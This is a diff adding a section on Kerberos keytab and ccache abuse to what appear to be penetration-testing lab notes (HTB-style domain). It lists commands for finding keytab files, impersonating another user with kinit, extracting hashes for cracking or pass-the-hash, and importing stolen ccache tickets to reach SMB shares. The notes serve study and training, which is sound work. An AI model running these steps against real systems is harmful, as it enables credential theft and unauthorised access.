@@ -368,6 +368,37 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
 - `cat md5-hashes.list`
 - `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`
 
+### keytab files
+
+Another everyday use of Kerberos in Linux is with keytab files. A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.
+
+Keytab files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.
+
+- `find / -name *keytab* -ls 2>/dev/null` search for keytab files
+- `crontab -l` (possible to find keytab in cron jobs)
+- `klist -k -t` listing keytab informations
+- `kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab` if you found another user's keytab file (here carlos) you can impersonate him with this command. And then you can use `klist` again
+- `smbclient //dc01/carlos -k -c ls` finally you can connect to this user's smb share.
+
+#### keytab extract
+
+- `python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab` Extracting Keytab Hashes with KeyTabExtract
+
+> then you can try to crack the hash with crackstation or hashcat or john. You can also perform a pass the hash attack with the ntlm hash
+
+- `su - carlos@inlanefreight.htb` you can login as the other user
+
+#### Importing ccache files
+
+If you find ccache files, you can import them and impersonate the user they belong to.
+
+```bash
+cp /tmp/krb5cc_647402606_91JyEJ .
+export KRB5CCNAME=/root/krb5cc_647402606_91JyEJ
+klist # to see if it worked
+smbclient //dc01/C$ -k -c ls -no-pass
+```
+
 ## Resources
 
 - [Linux User Auth](https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf)
